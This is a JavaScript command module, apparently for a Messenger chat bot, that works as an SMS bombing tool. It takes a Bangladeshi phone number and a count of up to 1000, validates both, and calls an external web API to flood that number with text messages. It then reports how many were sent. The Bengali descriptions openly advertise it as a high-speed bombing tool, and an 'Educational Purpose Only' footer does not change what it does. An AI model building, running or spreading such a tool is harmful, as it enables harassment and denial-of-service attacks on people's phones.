const axios = require('axios');

module.exports = {
  config: {
    name: "smb",
    version: "2.5.0",
    author: "BELAL ⊶ BOTX666 🪬",
    countDown: 10,
    role: 0,
    shortDescription: { en: "হাই স্পিড SMS বম্বিং টুল" },
    longDescription: "যেকোনো বাংলাদেশি নাম্বারে আনলিমিটেড (১০০০ পর্যন্ত) SMS পাঠান।",
    category: "Tools",
    guide: {
      en: "╭━━━❖✦🪬✦❖━━━╮\n  ✡️  চাঁদের 𖤍 পাহাড়  🪬\n╰━━━❖✦🪬✦❖━━━╯\n\n📝 𝗨𝘀𝗮𝗴𝗲:\n{pn} <number> <count>\n\n💡 𝗘𝘅𝗮𝗺𝗽𝗹𝗲:\n{pn} 01913246554 100"
    },
    aliases: ["smsbomb", "sbomb", "bomb"]
  },

  onStart: async function({ api, event, args, message }) {
    const sig = "\n┄┉❈✡️⋆⃝ 𖤍চাঁদের~পাহাড়𖤍 ⋆⃝🪬❈┉┄";
    
    try {
      if (args.length < 2) return this.showHelp(message, sig);

      const number = args[0];
      const count = parseInt(args[1]);

      // নাম্বারের বৈধতা যাচাই
      if (!this.isValidBangladeshiNumber(number)) {
        return message.reply(`❌ চাঁদের পাহাড়, নাম্বারটি সঠিক নয়!\n📱 সঠিক ফরম্যাট: 01XXXXXXXXX\n${sig}`);
      }

      // কাউন্ট যাচাই (সর্বোচ্চ ১০০০)
      if (isNaN(count) || count < 1 || count > 1000) {
        return message.reply(`❌ চাঁদের পাহাড়, কাউন্ট ১ থেকে ১০০০ এর মধ্যে হতে হবে!\n${sig}`);
      }

      // প্রসেসিং মেসেজ
      const processingMsg = await message.reply(
        `╭━━━━━━⊱⚙️⊰━━━━━━╮\n   𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐈𝐍𝐆 𝐒𝐓𝐀𝐑𝐓\n╰━━━━━━⊱✨⊰━━━━━━╯\n\n` +
        `📞 𝐓𝐚𝐫𝐠𝐞𝐭: ${number}\n` +
        `🎯 𝐂𝐨𝐮𝐧𝐭: ${count}\n` +
        `⚡ 𝐒𝐭𝐚𝐭𝐮𝐬: Initializing...\n\n🪬 চাঁদের পাহাড়, দয়া করে একটু অপেক্ষা করুন...`
      );

      // এপিআই কল
      const result = await this.sendSMSBomb(number, count);
      
      if (!result.success) {
        await api.unsendMessage(processingMsg.messageID);
        return message.reply(`❌ এরর: ${result.error || "এপিআই কাজ করছে না!"}\n${sig}`);
      }

      // রেজাল্ট ফরম্যাট
      const summary = result.data.summary;
      await api.editMessage(
        this.formatResults(summary, sig),
        processingMsg.messageID
      );

    } catch (error) {
      console.error("SMB error:", error);
      await message.reply("❌ চাঁদের পাহাড়, সার্ভারে সমস্যা হচ্ছে। আবার চেষ্টা করুন।");
    }
  },

  async sendSMSBomb(number, count) {
    try {
      const apiUrl = `https://shadowx-api.onrender.com/api/bm?num=${number}&count=${count}`;
      const response = await axios.get(apiUrl, { timeout: 120000 }); // ১২০ সেকেন্ড টাইমআউট
      return { success: true, data: response.data };
    } catch (error) {
      return { success: false, error: error.message };
    }
  },

  formatResults(summary, sig) {
    return `╭━━━━━━⊱📱⊰━━━━━━╮\n   𝐒𝐌𝐒 𝐁𝐎𝐌𝐁 𝐑𝐄𝐏𝐎𝐑𝐓\n╰━━━━━━⊱✨⊰━━━━━━╯\n\n` +
      `📞 𝐓𝐚𝐫𝐠𝐞𝐭: ${summary.target}\n` +
      `✅ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥: ${summary.successful}\n` +
      `❌ 𝐅𝐚𝐢𝐥𝐞𝐝: ${summary.failed}\n` +
      `📊 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: ${summary.success_rate_percent}\n` +
      `⏱️ 𝐃𝐮𝐫𝐚𝐭𝐢𝐨ন: ${summary.duration_formatted}\n\n` +
      `𖤍 𝐀𝐝𝐦𝐢𝐧: MD BELAL (BS Dealer)\n` +
      `🏠 𝐇𝐨𝐦𝐞: KURIGRAM, BD\n` +
      `⚠️ 𝐄𝐝𝐮𝐜𝐚𝐭𝐢𝐨𝐧𝐚𝐥 𝐏𝐮𝐫𝐩𝐨𝐬𝐞 𝐎𝐧𝐥𝐲${sig}`;
  },

  isValidBangladeshiNumber(number) {
    const cleanNumber = number.replace(/[^\d]/g, '');
    return cleanNumber.length === 11 && cleanNumber.startsWith('01') && /^[3-9]$/.test(cleanNumber[2]);
  },

  showHelp(message, sig) {
    return message.reply(
      `╭━━━❖✦🪬✦❖━━━╮\n  ✡️  চাঁদের 𖤍 পাহাড়  🪬\n╰━━━❖✦🪬✦❖━━━╯\n\n` +
      `📝 𝗨𝘀𝗮𝗴𝗲:\n/smb <নাম্বার> <পরিমাণ>\n\n📱 𝗘𝘅𝗮𝗺𝗽𝗹𝗲:\n/smb 01913246554 100\n\n` +
      `🏠 𝐃𝐞𝐯 𝐇𝐨𝐦𝐞: Kurigram\n` +
      `💼 𝐉𝐨𝐛: BS Dealer${sig}`
    );
  }
};
